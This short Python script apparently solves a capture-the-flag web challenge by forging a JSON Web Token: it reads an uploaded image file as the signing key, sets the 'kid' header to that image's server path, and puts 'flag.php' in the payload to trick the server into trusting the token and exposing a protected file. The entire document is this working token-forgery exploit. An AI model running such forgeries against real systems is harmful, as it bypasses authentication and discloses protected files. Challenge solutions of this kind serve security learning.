import jwt
f = open("key.png", "rb")
key = f.read()
cookie = jwt.encode({"banner": "flag.php"}, key, algorithm='HS256', headers={'kid': 'b/src/1608522282261.png'})
print(cookie)
